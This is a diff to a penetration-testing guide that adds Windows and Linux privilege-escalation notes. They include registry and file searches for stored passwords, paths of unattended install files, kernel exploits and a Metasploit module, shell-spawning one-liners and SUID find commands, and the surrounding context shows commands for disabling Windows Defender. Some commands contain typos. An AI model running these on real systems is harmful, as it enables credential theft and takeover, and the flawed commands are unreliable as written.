@@ -79,7 +79,8 @@
     - [Test for Format String Vulnerabilities](#test-for-format-string-vulnerabilities)
   - [Automating Internal Network PenTest Effort](#automating-internal-network-pentest-effort)
   - [Post Exploitation](#post-exploitation)
-    - [Escalating privileges](#escalating-privileges)
+    - [Escalating privileges on Windows](#escalating-privileges-on-windows)
+    - [Escalating privileges on Linux](#escalating-privileges-on-linux)
   - [Advanced Tips and Techniques](#advanced-tips-and-techniques)
   - [Document the Result](#document-the-result)
 - [Footnotes](#footnotes)
@@ -1172,12 +1173,53 @@ You've got a shell! Now, what!?
 | `net stop "Windows Defender Antivirus Service"` | Stops the services[^3] |
 | `net stop "Windows Defender Security Center Service"` | Stops the services[^3] |
 
-### Escalating privileges
+### Escalating privileges on Windows
 - Use meterpreter
   - `getsystem -h`
   - `incognito`
   - `list_tokens -u` + `impersonate_token <machine_name>\<user|Administrator>`
-  -
+- See [checklist](https://steflan-security.com/windows-privilege-escalation-cheat-sheet/)
+- Search data in a Windows shell
+  - `dir /s *pass* == *cred* == *vnc* == *.config*`
+  - `findstr /si password *.xml *.ini *.txt`
+- In the registry
+  - `reg query HKLM /f password /t REG_SZ /s`
+  - `reg query HKCU /f password /t REG_SZ /s`
+- In unattended files
+  - `c:\sysprep.inf`
+  - `c:\sysprepsysprep.xml`
+  - `%WINDIR%\Panther\Unattend\Unattended.xml`
+  - `%WINDIR%\Panther\Unattended.xml`
+### Escalating privileges on Linux
+- Dirty Cow for Ubuntu > 15.04
+- Overlayfs for Ubuntu <= 15.04. Available in Metasploit. Requires buteforcing a service (usually ssh)
+  - `use exploit/linux/local/overlayfs_priv_esc`
+- eBPF escalation, for Ubuntu == 16.04
+- Determine the kernel version, `uname -a`
+- Additional information, `cat /etc/lsb-release`
+- Spawn a bash shell (if the current shell is limited)
+
+```bash
+python -c 'import pty;pty.spawn("/bin/bash)'
+echo os.system('/bin/bash')
+/bin/bash -I
+```
+
+| Command | Description |
+| --- | --- |
+| `find / -perm -1000 -type d 2>/dev/null` | Finds directories only the owner of a file can rename or delete |
+| `find /perm -g=s -type f 2>/dev/null` | Finds files that run as the group, not the user who started the process |
+| `find /perm -u=s -type f 2>/dev/null` | Finds files that run as the owner, not the user who started the process |
+| `` |  |
+| `` |  |
+| `` |  |
+| `` |  |
+| `` |  |
+| `` |  |
+| `` |  |
+| `` |  |
+
+
 ## Advanced Tips and Techniques
 
 ## Document the Result
